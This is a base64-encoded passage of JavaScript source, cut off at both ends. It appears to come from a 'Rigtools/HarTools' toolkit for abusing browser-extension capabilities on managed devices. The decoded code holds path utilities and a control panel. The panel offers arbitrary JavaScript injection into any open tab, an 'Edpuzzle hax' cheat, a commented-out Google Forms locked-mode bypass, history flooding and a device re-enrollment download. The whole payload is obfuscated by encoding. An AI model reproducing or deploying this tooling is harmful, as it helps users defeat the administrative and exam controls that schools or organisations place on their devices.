wID0gMDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgZnJvbUNvZGUgPSBmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0ICsgaSk7CiAgICAgICAgICAgIHZhciB0b0NvZGUgPSB0by5jaGFyQ29kZUF0KHRvU3RhcnQgKyBpKTsKICAgICAgICAgICAgaWYgKGZyb21Db2RlICE9PSB0b0NvZGUpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZWxzZSBpZiAoZnJvbUNvZGUgPT09IDQ3KQogICAgICAgICAgICAgICAgbGFzdENvbW1vblNlcCA9IGk7CiAgICAgICAgfQogICAgICAgIHZhciBvdXQgPSAnJzsKCiAgICAgICAgZm9yIChpID0gZnJvbVN0YXJ0ICsgbGFzdENvbW1vblNlcCArIDE7IGkgPD0gZnJvbUVuZDsgKytpKSB7CiAgICAgICAgICAgIGlmIChpID09PSBmcm9tRW5kIHx8IGZyb20uY2hhckNvZGVBdChpKSA9PT0gNDcpIHsKICAgICAgICAgICAgICAgIGlmIChvdXQubGVuZ3RoID09PSAwKQogICAgICAgICAgICAgICAgICAgIG91dCArPSAnLi4nOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIG91dCArPSAnLy4uJzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKG91dC5sZW5ndGggPiAwKQogICAgICAgICAgICByZXR1cm4gb3V0ICsgdG8uc2xpY2UodG9TdGFydCArIGxhc3RDb21tb25TZXApOwogICAgICAgIGVsc2UgewogICAgICAgICAgICB0b1N0YXJ0ICs9IGxhc3RDb21tb25TZXA7CiAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQpID09PSA0NykKICAgICAgICAgICAgICAgICsrdG9TdGFydDsKICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQpOwogICAgICAgIH0KICAgIH0sCiAgICBfbWFrZUxvbmc6IGZ1bmN0aW9uIF9tYWtlTG9uZyhwYXRoKSB7CiAgICAgICAgcmV0dXJuIHBhdGg7CiAgICB9LAogICAgZGlybmFtZTogZnVuY3Rpb24gZGlybmFtZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHJldHVybiAnLic7CiAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoMCk7CiAgICAgICAgdmFyIGhhc1Jvb3QgPSBjb2RlID09PSA0NzsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgZm9yICh2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAxOyAtLWkpIHsKICAgICAgICAgICAgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CiAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgIGVuZCA9IGk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKGVuZCA9PT0gLTEpIHJldHVybiBoYXNSb290ID8gJy8nIDogJy4nOwogICAgICAgIGlmIChoYXNSb290ICYmIGVuZCA9PT0gMSkgcmV0dXJuICcvLyc7CiAgICAgICAgcmV0dXJuIHBhdGguc2xpY2UoMCwgZW5kKTsKICAgIH0sCiAgICBiYXNlbmFtZTogZnVuY3Rpb24gYmFzZW5hbWUocGF0aCwgZXh0KSB7CiAgICAgICAgaWYgKGV4dCAhPT0gdW5kZWZpbmVkICYmIHR5cGVvZiBleHQgIT09ICdzdHJpbmcnKSB0aHJvdyBuZXcgVHlwZUVycm9yKCciZXh0IiBhcmd1bWVudCBtdXN0IGJlIGEgc3RyaW5nJyk7CgogICAgICAgIHZhciBzdGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIHZhciBpOwogICAgICAgIGlmIChleHQgIT09IHVuZGVmaW5lZCAmJiBleHQubGVuZ3RoID4gMCAmJiBleHQubGVuZ3RoIDw9IHBhdGgubGVuZ3RoKSB7CiAgICAgICAgICAgIGlmIChleHQubGVuZ3RoID09PSBwYXRoLmxlbmd0aCAmJiBleHQgPT09IHBhdGgpIHJldHVybiAnJzsKICAgICAgICAgICAgdmFyIGV4dElkeCA9IGV4dC5sZW5ndGggLSAxOwogICAgICAgICAgICB2YXIgZmlyc3ROb25TbGFzaEVuZCA9IC0xOwogICAgICAgICAgICBmb3IgKGkgPSBwYXRoLmxlbmd0aCAtIDE7IGkgPj0gMDsgLS1pKSB7CiAgICAgICAgICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgICAgICBzdGFydCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmIChmaXJzdE5vblNsYXNoRW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0Tm9uU2xhc2hFbmQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKGV4dElkeCA+PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29kZSA9PT0gZXh0LmNoYXJDb2RlQXQoZXh0SWR4KSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC0tZXh0SWR4ID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQgPSBpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dElkeCA9IC0xOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kID0gZmlyc3ROb25TbGFzaEVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoc3RhcnQgPT09IGVuZCkgZW5kID0gZmlyc3ROb25TbGFzaEVuZDsKICAgICAgICAgICAgZWxzZSBpZiAoZW5kID09PSAtMSkgZW5kID0gcGF0aC5sZW5ndGg7CiAgICAgICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0LCBlbmQpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZvciAoaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgICAgIGlmIChwYXRoLmNoYXJDb2RlQXQoaSkgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgcmV0dXJuICcnOwogICAgICAgICAgICByZXR1cm4gcGF0aC5zbGljZShzdGFydCwgZW5kKTsKICAgICAgICB9CiAgICB9LAogICAgZXh0bmFtZTogZnVuY3Rpb24gZXh0bmFtZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICB2YXIgc3RhcnREb3QgPSAtMTsKICAgICAgICB2YXIgc3RhcnRQYXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CgogICAgICAgIHZhciBwcmVEb3RTdGF0ZSA9IDA7CiAgICAgICAgZm9yICh2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQYXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ2KSB7CgogICAgICAgICAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSkKICAgICAgICAgICAgICAgICAgICBzdGFydERvdCA9IGk7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChwcmVEb3RTdGF0ZSAhPT0gMSkKICAgICAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IDE7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhcnREb3QgIT09IC0xKSB7CgogICAgICAgICAgICAgICAgcHJlRG90U3RhdGUgPSAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xIHx8IGVuZCA9PT0gLTEgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAwIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMSAmJiBzdGFydERvdCA9PT0gZW5kIC0gMSAmJiBzdGFydERvdCA9PT0gc3RhcnRQYXJ0ICsgMSkgewogICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0RG90LCBlbmQpOwogICAgfSwKICAgIGZvcm1hdDogZnVuY3Rpb24gZm9ybWF0KHBhdGhPYmplY3QpIHsKICAgICAgICBpZiAocGF0aE9iamVjdCA9PT0gbnVsbCB8fCB0eXBlb2YgcGF0aE9iamVjdCAhPT0gJ29iamVjdCcpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IFR5cGVFcnJvcignVGhlICJwYXRoT2JqZWN0IiBhcmd1bWVudCBtdXN0IGJlIG9mIHR5cGUgT2JqZWN0LiBSZWNlaXZlZCB0eXBlICcgKyB0eXBlb2YgcGF0aE9iamVjdCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBfZm9ybWF0KCcvJywgcGF0aE9iamVjdCk7CiAgICB9LAogICAgcGFyc2U6IGZ1bmN0aW9uIHBhcnNlKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIHZhciByZXQgPSB7CiAgICAgICAgICAgIHJvb3Q6ICcnLAogICAgICAgICAgICBkaXI6ICcnLAogICAgICAgICAgICBiYXNlOiAnJywKICAgICAgICAgICAgZXh0OiAnJywKICAgICAgICAgICAgbmFtZTogJycKICAgICAgICB9OwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuIHJldDsKICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdCgwKTsKICAgICAgICB2YXIgaXNBYnNvbHV0ZSA9IGNvZGUgPT09IDQ3OwogICAgICAgIHZhciBzdGFydDsKICAgICAgICBpZiAoaXNBYnNvbHV0ZSkgewogICAgICAgICAgICByZXQucm9vdCA9ICcvJzsKICAgICAgICAgICAgc3RhcnQgPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0YXJ0ID0gMDsKICAgICAgICB9CiAgICAgICAgdmFyIHN0YXJ0RG90ID0gLTE7CiAgICAgICAgdmFyIHN0YXJ0UGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIHZhciBpID0gcGF0aC5sZW5ndGggLSAxOwoKICAgICAgICB2YXIgcHJlRG90U3RhdGUgPSAwOwoKICAgICAgICBmb3IgKDsgaSA+PSBzdGFydDsgLS1pKSB7CiAgICAgICAgICAgIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQYXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ2KSB7CgogICAgICAgICAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSkgc3RhcnREb3QgPSBpOwogICAgICAgICAgICAgICAgZWxzZSBpZiAocHJlRG90U3RhdGUgIT09IDEpIHByZURvdFN0YXRlID0gMTsKICAgICAgICAgICAgfSBlbHNlIGlmIChzdGFydERvdCAhPT0gLTEpIHsKCiAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IC0xOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEgfHwgZW5kID09PSAtMSB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDAgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAxICYmIHN0YXJ0RG90ID09PSBlbmQgLSAxICYmIHN0YXJ0RG90ID09PSBzdGFydFBhcnQgKyAxKSB7CiAgICAgICAgICAgIGlmIChlbmQgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBpZiAoc3RhcnRQYXJ0ID09PSAwICYmIGlzQWJzb2x1dGUpIHJldC5iYXNlID0gcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKDEsIGVuZCk7CiAgICAgICAgICAgICAgICBlbHNlIHJldC5iYXNlID0gcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgZW5kKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmIChzdGFydFBhcnQgPT09IDAgJiYgaXNBYnNvbHV0ZSkgewogICAgICAgICAgICAgICAgcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKDEsIHN0YXJ0RG90KTsKICAgICAgICAgICAgICAgIHJldC5iYXNlID0gcGF0aC5zbGljZSgxLCBlbmQpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgc3RhcnREb3QpOwogICAgICAgICAgICAgICAgcmV0LmJhc2UgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgZW5kKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXQuZXh0ID0gcGF0aC5zbGljZShzdGFydERvdCwgZW5kKTsKICAgICAgICB9CiAgICAgICAgaWYgKHN0YXJ0UGFydCA+IDApIHJldC5kaXIgPSBwYXRoLnNsaWNlKDAsIHN0YXJ0UGFydCAtIDEpOwogICAgICAgIGVsc2UgaWYgKGlzQWJzb2x1dGUpIHJldC5kaXIgPSAnLyc7CiAgICAgICAgcmV0dXJuIHJldDsKICAgIH0sCiAgICBzZXA6ICcvJywKICAgIGRlbGltaXRlcjogJzonLAogICAgd2luMzI6IG51bGwsCiAgICBwb3NpeDogbnVsbAp9Owpjb25zdCBzbGlkZXMgPSBbXTsKbGV0IGFjdGl2ZVNsaWRlSWR4ID0gMDsKY29uc3QgaGFuZGxlQ2FsbGJhY2tzXyA9IFtdOwpjb25zdCBXQUlUX0ZPUl9GSU5JU0ggPSAxOwpyZXF1ZXN0QW5pbWF0aW9uRnJhbWUoZnVuY3Rpb24gYSh0KSB7CiAgICBmb3IgKGNvbnN0IGNiIG9mIGhhbmRsZUNhbGxiYWNrc18pIHsKICAgICAgICBsZXQgbTsKICAgICAgICBpZiAoKG0gPSBjYi5mLmFwcGx5KG51bGwsIFt0IC0gY2IudF0pKSkgewogICAgICAgICAgICBpZiAobSA9PT0gMSkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaGFuZGxlQ2FsbGJhY2tzXy5zcGxpY2UoaGFuZGxlQ2FsbGJhY2tzXy5pbmRleE9mKGNiKSwgMSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoYSk7Cn0pOwpjb25zdCBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lID0gKGNiLCB0aGl6ID0gbnVsbCwgYXJncyA9IFtdKSA9PiB7CiAgICBoYW5kbGVDYWxsYmFja3NfLnB1c2goewogICAgICAgIGY6IGNiLAogICAgICAgIHQ6IHBlcmZvcm1hbmNlLm5vdygpLAogICAgfSk7Cn07CgpjbGFzcyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKICAgIHN0YXRpYyB0ZW1wbGF0ZSA9IGAKICA8dGl0bGU+VW50aXRsZWQgZG9jdW1lbnQ8L3RpdGxlPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLXJpZ3Rvb2xzMTI4cGx1cy9yZWZzL2hlYWRzL21haW4vZG9jcy5pY28iPgogIDxkaXYgaWQ9ImV4dF9kZWZhdWx0Ij4KICAgIDxkaXYgaWQ9ImRlZmF1bHRfZXh0ZW5zaW9uX2NhcGFiaWxpdGllcyI+CiAgICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9oYXJ0b29scy5naWYiIGFsdD0iSGFyVG9vbHMgTG9nbyIgY2xhc3M9ImxvZ28iIC8+CiAgICAgICAgPGgxPiBEZWZhdWx0IEV4dGVuc2lvbiBDYXBhYmlsaXRpZXMgPC9oMT4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9InRhYnMtYnV0dG9ucyI+CiAgICAgICAgPHA+T24gdGFiIHVwZGF0ZTwvcD4KICAgICAgICA8ZGl2IGlkPSJ0b2dnbGVhYmxlLWJ1dHRvbnMiPiAKCQk8d2hpdGVidXR0b25zPgogICAgICAgICAgPGJ1dHRvbiBpZD0iZXJ1ZGEiPkVydWRhPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJjaGlpIj5DaGlpPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJhZGJsb2NrIj5BZGJsb2NrPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJlZHB1enpsZSI+RWRwdXp6bGUgaGF4PC9idXR0b24+CiAgICAgICAgICA8IS0tIDxidXR0b24gaWQ9Imdsb2NrZWQiPkdmb3JtcyBMb2NrZWQgTW9kZSBieXBhc3M8L2J1dHRvbj4gLS0+CgkJPC93aGl0ZWJ1dHRvbnM+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGlkPSJvdGhlci1idXR0b25zIj4KICAgICAgICA8cD5PdGhlciBzY3JpcHRzPC9wPgoJCTx3aGl0ZWJ1dHRvbnM+CiAgICAgICAgPGJ1dHRvbiBpZD0ic3dhbXAiPlN3YW1wPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0idXBkYXRlIj5VcGRhdGUgUmlndG9vbHM8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGlkPSJxdWljay1ybXYtYmx0Ij5RdWljayBSZW1vdmUgQmxvYXQgKHVzZWQgdy8gZ2Zvcm1zIGV4dGVuKTwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9ImhzdGZsZCI+SGlzdG9yeSBGbG9vZDwvYnV0dG9uPgoJCTwvd2hpdGVidXR0b25zPgogICAgICA8L2Rpdj4KICAgICAgPGgyPkV2YWx1YXRlIGNvZGU8L2gxPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICA8dGV4dGFyZWEgaWQ9ImNvZGUiIHBsYWNlaG9sZGVyPSJFbnRlciBKYXZhU2NyaXB0IHRvIGluamVjdCI+PC90ZXh0YXJlYT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8YnV0dG9uIGlkPSJjb2RlLXJ1biI+UnVuPC9idXR0b24+CiAgICAgICAgIDxoMj4gUmlpZW5yb2xsbWVudCA8L2gyPgogICAgICAgIDxidXR0b24gaWQ9ImZvcnJlZW5yb2xsIj4gRG93bmxvYWQgemlwIDwvYnV0dG9uPgogICAgICAgIDxkaXYgaWQ9ImNvZGUtb3V0cHV0Ij48L2Rpdj4KCiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImV4dGVuc2lvbl90YWJzX2RlZmF1bHQiPgogICAgICA8YnV0dG9uIGlkPSJ0YWJyZWxvYWQiPlJlZnJlc2ggVGFiczwvYnV0dG9uPgogICAgICA8dWw+CiAgICAgIDwvdWw+CiAgICAgIDxpbnB1dCBpZD0iVGFiVVJMSW5wdXQiLz4gPGJ1dHRvbiBpZD0iVGFiVVJMU3VibWl0Ij5DcmVhdGU8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2PgogIGA7CiAgICB1cGRhdGVUYWJMaXN0KCkgewogICAgICAgIGlmICh0aGlzLmRpc2FybWVkKSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGlmICh0aGlzLnRhYkxpc3RJblByb2dyZXNzKSB7CgogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIHRoaXMudGFiTGlzdEluUHJvZ3Jlc3MgPSB0cnVlOwoKICAgICAgICBjb25zdCB0YWJsaXN0ID0gZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXh0ZW5zaW9uX3RhYnNfZGVmYXVsdCB1bCIpOwoKICAgICAgICB0YWJsaXN0LmlubmVySFRNTCA9ICIiOwogICAgICAgIGNvbnN0IHRoaXogPSB0aGlzOwogICAgICAgIGNocm9tZS53aW5kb3dzLmdldEFsbChmdW5jdGlvbih3aW4pIHsKICAgICAgICAgICAgd2luLmZvckVhY2goZnVuY3Rpb24odikgewogICAgICAgICAgICAgICAgY2hyb21lLnRhYnMucXVlcnkoewogICAgICAgICAgICAgICAgICAgIHdpbmRvd0lkOiB2LmlkCiAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbih0YWJJbmZvcykgewogICAgICAgICAgICAgICAgICAgIHRhYkluZm9zLmZvckVhY2goZnVuY3Rpb24oaW5mbykgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBkaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmNsYXNzTmFtZSA9ICJ0YWJsaXN0LWl0ZW0iOwogICAgICAgICAgICAgICAgICAgICAgICBkaXYuaW5uZXJIVE1MID0gYDxpbWcgJHsKICAgICAgICAgICAgICBjaHJvbWUudGFicyAmJiAoaW5mby5mYXZJY29uVXJsPy5sZW5ndGggPz8gMCkgPiAwCiAgICAgICAgICAgICAgICA/IGBzcmM9IiR7aW5mby5mYXZJY29uVXJsfSJgCiAgICAgICAgICAgICAgICA6ICIiCiAgICAgICAgICAgIH0vPjxzcGFuIGNsYXNzPSJ0YWItbmFtZSI+JHtpbmZvLnRpdGxlfSA8bGl0c3R1ZmY+ICR7aW5mby51cmx9PGxpdHN0dWZmPjwvc3Bhbj5gOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2hyb21lLnNjcmlwdGluZyB8fCBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBydW5CdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJ1bkJ1dHRvbi50ZXh0Q29udGVudCA9ICJSdW4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVuQnV0dG9uLm9uY2xpY2sgPSAoKSA9PiBydW5Db2RlKHRydWUsIGluZm8uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmFwcGVuZENoaWxkKHJ1bkJ1dHRvbik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHByZXZpZXdCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlld0J1dHRvbi50ZXh0Q29udGVudCA9ICJQcmV2aWV3IjsKCiAgICAgICAgICAgICAgICAgICAgICAgIHByZXZpZXdCdXR0b24ub25jbGljayA9ICgpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gdHJ1ZTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6LnByZXZpZXdpbmcgPSB0cnVlOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS53aW5kb3dzLnVwZGF0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLndpbmRvd0lkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvY3VzZWQ6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKGluZm8uaWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGl2ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmN1cnJlbnRUaW1lb3V0ID0gc2V0VGltZW91dChmdW5jdGlvbiBtKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFyVGltZW91dCh3aW5kb3cuY3VycmVudFRpbWVvdXQpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5nZXRDdXJyZW50KGZ1bmN0aW9uKHRhYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUud2luZG93cy51cGRhdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWIud2luZG93SWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2N1c2VkOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZSh0YWIuaWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aXZlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5kaXNhcm0gPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6Ln